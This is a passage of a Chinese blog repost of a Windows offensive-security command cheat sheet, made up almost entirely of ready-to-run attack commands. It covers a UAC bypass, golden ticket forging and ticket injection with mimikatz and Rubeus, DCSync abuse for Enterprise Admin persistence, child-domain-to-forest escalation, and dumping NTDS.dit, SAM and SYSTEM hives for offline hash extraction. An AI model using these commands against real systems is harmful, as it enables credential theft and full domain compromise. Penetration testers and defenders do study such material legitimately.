class="hljs-literal">-password</span> pass:mimikatz <span class="hljs-literal">-keyex</span> <span class="hljs-literal">-CSP</span> <span class="hljs-string">&quot;Microsoft Enhanced Cryptographic Provider v1.0&quot;</span> <span class="hljs-literal">-export</span> <span class="hljs-literal">-out</span> cert.pfx<br><br>certutil <span class="hljs-literal">-user</span> <span class="hljs-literal">-p</span> mimikatz <span class="hljs-literal">-importpfx</span> cert.pfx NoChain,NoRoot<br></code></pre></td></tr></table></figure>
<h2 id="UAC-Bypass"><a href="#UAC-Bypass" class="headerlink" title="UAC Bypass"></a>UAC Bypass</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs powershell">https://egre55.github.io/system<span class="hljs-literal">-properties-uac-bypass</span>/ - Read Ghoul writeup on HTB <span class="hljs-keyword">for</span> more Info <br><br>findstr /C:<span class="hljs-string">&quot;&lt;autoElevate&gt;true&quot;</span> <br><br>C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe<br>C:\Windows\SysWOW64\SystemPropertiesComputerName.exe<br>C:\Windows\SysWOW64\SystemPropertiesHardware.exe<br>C:\Windows\SysWOW64\SystemPropertiesProtection.exe<br>C:\Windows\SysWOW64\SystemPropertiesRemote.exe<br></code></pre></td></tr></table></figure>
<h2 id="黄金票据攻击"><a href="#黄金票据攻击" class="headerlink" title="黄金票据攻击"></a>黄金票据攻击</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># Check my Blog Post Kerberos Attacks in Depth for Further Information</span><br><span class="hljs-comment">#https://m0chan.github.io/Kerberos-Attacks-In-Depth</span><br><br><span class="hljs-comment"># 使用NTLM生成TGT</span><br>mimikatz <span class="hljs-comment"># kerberos::golden /domain:&lt;domain_name&gt;/sid:&lt;domain_sid&gt; /rc4:&lt;krbtgt_ntlm_hash&gt; /user:&lt;user_name&gt;</span><br><br><span class="hljs-comment"># 使用AES 128密钥生成TGT</span><br>mimikatz <span class="hljs-comment"># kerberos::golden /domain:&lt;domain_name&gt;/sid:&lt;domain_sid&gt; /aes128:&lt;krbtgt_aes128_key&gt; /user:&lt;user_name&gt;</span><br><br><span class="hljs-comment"># 使用AES 256密钥生成TGT（更安全的加密，可能更隐蔽，因为Microsoft默认使用）</span><br>mimikatz <span class="hljs-comment"># kerberos::golden /domain:&lt;domain_name&gt;/sid:&lt;domain_sid&gt; /aes256:&lt;krbtgt_aes256_key&gt; /user:&lt;user_name&gt;</span><br><br><span class="hljs-comment"># 用Mimikatz注射TGT</span><br>mimikatz <span class="hljs-comment"># kerberos::ptt &lt;ticket_kirbi_file&gt;</span><br><br><br><span class="hljs-comment"># 用Rebeus注射票证</span><br>.\Rubeus.exe ptt /ticket:&lt;ticket_kirbi_file&gt;<br><br>.\PsExec.exe <span class="hljs-literal">-accepteula</span> \\&lt;remote_hostname&gt; cmd<br></code></pre></td></tr></table></figure>
<h2 id="DCSync-和-金票合一"><a href="#DCSync-和-金票合一" class="headerlink" title="DCSync 和 金票合一"></a>DCSync 和 金票合一</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># https://raw.githubusercontent.com/vletoux/MakeMeEnterpriseAdmin/master/MakeMeEnterpriseAdmin.ps1</span><br><br><br>此脚本将滥用DCSync权限提取krbtgt密码，并在最终将其导入当前会话之前自动生成一个黄金票证。<br><br>然后，您可以将自己添加到Domain Admins/Enterprise Admins组中以获得持久性。<br><br>.\MakeMeEnterpriseAdmin.ps1<br></code></pre></td></tr></table></figure>
<h2 id="子域到林的妥协"><a href="#子域到林的妥协" class="headerlink" title="子域到林的妥协"></a>子域到林的妥协</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs powershell">Domain = Logical <span class="hljs-built_in">group</span> of objects (users, computers, servers etc etc) supported from a central location like a DC<br><br>Tree = <span class="hljs-built_in">Set</span> of domains <span class="hljs-keyword">using</span> same name space (DNS Name)<br><br>Trust = Agreement between <span class="hljs-number">2</span> domains that allow cross<span class="hljs-literal">-domain</span> access to resources etc. i/e Michelle@dev.m0chan.com may be able to access resources inside HR.m0chan.com.<br><br>Forest = Largest Structure composed of all trees.<br><br>Most trees are linked with dual sided trust relationships to allow <span class="hljs-keyword">for</span> sharing of resources.<br><br>By default the first domain created <span class="hljs-keyword">if</span> the Forest Root.<br><br>Lets say we have owned a domain controller and got the KRBTGT Hash (The keys to the castle) we can now create <br><br>Covert<span class="hljs-literal">-NameToSid</span> target.domain.com\krbtgt<br>S<span class="hljs-literal">-1-5-21-2941561648-383941485-1389968811-502</span><br><br>Replace <span class="hljs-number">502</span> with <span class="hljs-number">519</span> to represent Enterprise Admins<br><br>Create golden ticket and attack parent domain. <br><br><br>This will not work <span class="hljs-keyword">if</span> there is SID Filtering <span class="hljs-keyword">in</span> place <span class="hljs-keyword">for</span> respective target domain.<br><br>harmj0ys article explains it best. <br><br><span class="hljs-comment">#http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/</span><br></code></pre></td></tr></table></figure>
<h2 id="转储-NTDS-dit"><a href="#转储-NTDS-dit" class="headerlink" title="转储 NTDS.dit"></a>转储 NTDS.dit</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs powershell">C:\vssadmin create shadow /<span class="hljs-keyword">for</span>=C:<br><span class="hljs-built_in">copy</span> \\?<br>\GLOBALROOT\Device\HarddiskVolumeShadowCopy[<span class="hljs-type">DISK_NUMBER</span>]\windows\ntds\ntds.dit<br>.<br><span class="hljs-built_in">copy</span> \\?<br>\GLOBALROOT\Device\HarddiskVolumeShadowCopy[<span class="hljs-type">DISK_NUMBER</span>]\windows\system32\config\SYSTEM<br>.<br><span class="hljs-built_in">copy</span> \\?<br>\GLOBALROOT\Device\HarddiskVolumeShadowCopy[<span class="hljs-type">DISK_NUMBER</span>]\windows\system32\config\SAM<br>.<br>reg SAVE HKLM\SYSTEM c:\SYS<br>vssadmin delete shadows /<span class="hljs-keyword">for</span>= [/<span class="hljs-type">oldest</span> | /<span class="hljs-type">all</span> | /<span class="hljs-type">shadow</span>=]<br><br><br><span class="hljs-keyword">If</span> you pwn a BackupOperator account with SeBackupPrivilege you can also dump NTDS.dit<br></code></pre></td></tr></table></figure>
<h2 id="备份转储-NTDS-dit"><a href="#备份转储-NTDS-dit" class="headerlink" title="备份转储 NTDS.dit"></a>备份转储 NTDS.dit</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Import-Module</span> .\SeBackupPrivilegeCmdLets.dll<br><span class="hljs-built_in">Import-Module</span> .\SeBackupPrivilegeUtils.dll<br><br><span class="hljs-built_in">PS</span> C:\m0chan&gt; <span class="hljs-built_in">Get-SeBackupPrivilege</span><br>SeBackupPrivilege is disabled<br><br><span class="hljs-built_in">PS</span> C:\m0chan&gt; <span class="hljs-built_in">Set-SeBackupPrivilege</span><br><br><span class="hljs-built_in">PS</span> C:\m0chan&gt; <span class="hljs-built_in">Get-SeBackupPrivilege</span><br>SeBackupPrivilege is enabled<br><br><span class="hljs-built_in">PS</span> C:\m0chan&gt; <span class="hljs-built_in">Copy-FileSeBackupPrivilege</span> P:\Windows\System32\ntds.dit C:\m0chan\ntds.dit <span class="hljs-literal">-Overwrite</span><br>Copied <span class="hljs-number">12582912</span> bytes<br><br>Use diskshadow to <span class="hljs-built_in">mount</span> a shadow <span class="hljs-built_in">copy</span> and then <span class="hljs-built_in">copy</span> Windows\system32\ntds.dit <br><br>Remember and not use C:\Windows\ntds\ntds.dit<br><br>reg.exe save hklm\system c:\m0chan\SYSTEM.bak<br></code></pre></td></tr></table></figure>
<h2 id="SecretsDumper-Windows"><a href="#SecretsDumper-Windows" class="headerlink" title="SecretsDumper Windows"></a>SecretsDumper Windows</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">#https://github.com/maaaaz/impacket-examples-windows</span><br>secretsdumper.exe <span class="hljs-literal">-ntds</span> ~/Extract/ntds.dit <span class="hljs-literal">-system</span> ~/Extract/SYSTEM <span class="hljs-literal">-hashes</span> lmhash:nthash LOCAL <span class="hljs-literal">-outputfile</span> ntlm<span class="hljs-literal">-extract</span><br></code></pre></td></tr></table></figure>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="category-chain-item">学习笔记</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/Offensive-security/" class="print-no-link">#Offensive security</a>
      
        <a href="/tags/Windows-Command-Notes/" class="print-no-link">#Windows Command Notes</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>Windows 命令备忘笔记集合-hacktoday.net-2020.12.01版本</div>
      <div>https://sh1yan.top/2024/06/02/Windows-Command-Notes-Collection-hacktoday-net-20201201/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>shiyan</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2024年6月2日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2024/06/02/Windows-Common-Command-Horizontal-Move-h4rithd-20240403/" title="Windows常用命令-横向移动-h4rithd-2024.04.03版本">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">Windows常用命令-横向移动-h4rithd-2024.04.03版本</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2024/06/02/Windows-privilege-escalation-h4rithd-20240403/" title="Windows特权提升-h4rithd-2024.04.03版本">
                        <span class="hidden-mobile">Windows特权提升-h4rithd-2024.04.03版本</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a  rel="nofollow noopener"><span>Copyrights &copy; 2016-2025</span></a> <i class="iconfont icon-love"></i> <a  rel="nofollow noopener"><span>shiyan</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
